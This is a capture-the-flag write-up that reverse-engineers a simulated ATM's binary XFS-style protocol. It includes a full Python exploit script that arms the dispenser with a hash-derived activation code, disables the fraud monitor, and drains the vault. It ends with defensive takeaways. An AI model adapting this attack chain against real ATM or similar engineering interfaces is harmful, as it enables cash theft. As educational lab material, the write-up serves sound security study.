Jackpot: reverse-engineering a binary ATM protocol

A simulated ATM listens on port 9100 and speaks a custom binary protocol modeled on the real-world XFS standard. No card, no PIN, just raw TCP packets. Here's how I mapped the protocol, reversed the activation-code binary, and chained it into one persistent socket to drain the vault.

Room: Jackpot Category: Binary / Network Protocol Tools: netcat, objdump, python3

The setup: the ATM's engineering interface is reachable over raw TCP, no card, no PIN. The job: reverse the binary framing protocol, derive a valid activation code from a binary the challenge provides, and chain enough commands together in one connection to drain the vault and reach a hidden flag command.

Best part: the service documents its own protocol if you just ask it to.

Background, In Plain Terms

XFS

eXtensions for Financial Services, the real Windows API ATM software uses to talk to hardware (card readers, dispensers). Every command has a numeric ID and falls into two families: GETINFO (read state) and EXECUTE (do something). This challenge emulates that structure over a raw socket.

Binary framing

Most web APIs send plain text. This service sends raw bytes: a fixed header telling you how many bytes of payload follow, then the payload. You build and parse those byte sequences by hand instead of just reading JSON off the wire.

The Investigation

1
Let the service describe itself

Connecting with netcat alone was enough to learn the protocol. The service sends a self-describing banner on every new connection:

nc 10.144.130.165 9100 | xxd
{"service": "Branch Engineering Gateway", "protocol": "XFS bridge",
 "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
 "reply_format": "2 byte big-endian length + <length> bytes of JSON",
 "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
 "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}
Why this works

A service that documents its own request format and hands you the next query to run has effectively given away its attack surface. Always try the simplest possible interaction first, here, just connecting, before reaching for a disassembler.

2
Pull the full command table

Following the hint, a GETINFO for command 0x0304. The packet is just the header format from the banner, built by hand:

\x01              msg_type = GETINFO
\x00\x00\x03\x04  command id 0x0304, big-endian
\x00\x00          data length = 0 (no payload)

$ printf '\x01\x00\x00\x03\x04\x00\x00' | nc 10.144.130.165 9100 | strings

That returned the full command table: a status query, cash unit info, a DISPENSE command, an ARM command that clearly needs authentication, a fraud SET_MONITOR command, a hidden GET_FLAG command, and a 40-note cap per dispense call.

Why this works

Reading a binary protocol's own introspection endpoint (if it has one) beats guessing command IDs by brute force. It also tells you the shape of the exploit before you've written a line of exploit code: arm, then dispense, then flag.

3
Reverse the activation-code binary

A stripped 64-bit ELF named jackpot ships with the challenge. Disassembly shows it takes a 6-digit session nonce as its argument, runs FNV-1a (a fast non-cryptographic hash) over the nonce plus a hardcoded salt, then prints hash % 100000000 as an 8-digit activation code.

$ ./jackpot 123456
[*] session nonce : 123456
[*] activation code: 47384178

The nonce has to come from the ATM itself, per connection. Guessing it produces an "invalid activation code" error.

Why this works

A deterministic hash is not authentication if the attacker can run the same hash function. Once the binary is reversed, the "activation code" is just a calculator, not a secret.

4
Notice the state resets per connection

Each new nc invocation opens a fresh TCP connection, and the ATM hands out a new session nonce every time. The armed state and the fraud-monitor state are scoped to the connection too. Sending ARM on one connection and DISPENSE on the next just resets everything and locks with a "null transaction id" error.

Why this works

Per-connection state is a common pattern for interfaces that assume a slower, human-paced session. An attacker who understands the lifecycle just does everything inside one persistent socket instead of several manual netcat calls.

5
Chain it into one script

One socket, one session: read the status for the nonce, feed it to the jackpot binary for the activation code, arm the dispenser, kill the fraud monitor, dispense in batches of 40 until the vault is empty, then call the flag command.

#!/usr/bin/python
import socket, struct, json, subprocess

HOST, PORT = '10.144.130.165', 9100

def read_frame(s):
    length_bytes = b''
    while len(length_bytes) < 2:
        length_bytes += s.recv(2 - len(length_bytes))
    length = struct.unpack('>H', length_bytes)[0]
    data = b''
    while len(data) < length:
        data += s.recv(length - len(data))
    return json.loads(data)

def send_cmd(s, msg_type, cmd_id, data=b''):
    pkt = bytes([msg_type]) + struct.pack('>I', cmd_id) + struct.pack('>H', len(data)) + data
    s.sendall(pkt)
    return read_frame(s)

s = socket.socket()
s.connect((HOST, PORT))
banner = read_frame(s)

status = send_cmd(s, 0x01, 0x0301)
nonce = status['status']['nonce']
remaining = status['status']['remaining_notes']

result = subprocess.run(['./jackpot', nonce], capture_output=True, text=True)
activation_code = None
for line in result.stdout.splitlines():
    if 'activation code' in line:
        activation_code = line.split(':')[-1].strip()

arm = send_cmd(s, 0x02, 0x04f0, activation_code.encode())
monitor = send_cmd(s, 0x02, 0x04f1, b'off')

for i in range(remaining // 40):
    send_cmd(s, 0x02, 0x0401, b'40')

flag = send_cmd(s, 0x02, 0x04ff)
s.close()
Why this works

The exploit is really just a translation of the protocol spec and the command table from steps 1 and 2 into code, plus the activation code from step 3. Nothing here is a novel trick, it's the same manual packet you'd send with printf | nc, just automated and kept on one socket.

6
Run it and close the loop
$ python3 exploit.py
[*] ARM: {'rc': 'WFS_SUCCESS', 'detail': 'armed - supervisor mode'}
[*] SET_MONITOR: {'rc': 'WFS_SUCCESS', 'monitor_on': False}
[*] DISPENSE: notes=40 each call, remaining counts down to 0
[*] FLAG: {'rc': 'WFS_SUCCESS', 'flag': [redacted]}
Why this works

The flag command only returns successfully once the vault balance actually reaches zero. It's a server-side check, not a client-side reveal, so the whole chain (nonce, activation code, arm, monitor, dispense) has to be correct and in order before it pays out.

Full Attack Chain

nc port 9100
  → banner: protocol spec + hint
       → GETINFO 0x304: full command table
            → GET_FLAG exists at 0x4ff (needs vault empty)
            → ARM at 0x4f0 (needs activation code)
       → GETINFO 0x301: session nonce per connection
            → ./jackpot <nonce>: FNV-1a hash → activation code
                 → EXECUTE ARM with code: supervisor mode
                      → EXECUTE SET_MONITOR off: fraud lock disabled
                           → EXECUTE DISPENSE in batches: vault = 0
                                → EXECUTE GET_FLAG

Takeaways

Self-describing protocols help attackers too

The ATM banner documented its own command set, packet format, and even hinted at the first query to run. Engineering interfaces like this should never be reachable from untrusted networks, and definitely shouldn't advertise their own attack surface.

Per-connection state needs defending explicitly

The fraud monitor and the armed state both reset on every new connection. Understanding that session lifecycle is what let the whole chain run inside one socket, bypassing controls that assumed a slower, human-paced interaction.

A deterministic hash is not authentication

The session nonce was readable in plaintext from the same socket. Feeding it into a hash function to produce an "activation code" gives no real security: anyone with the binary can compute the code. Real authentication requires a secret the attacker doesn't have.
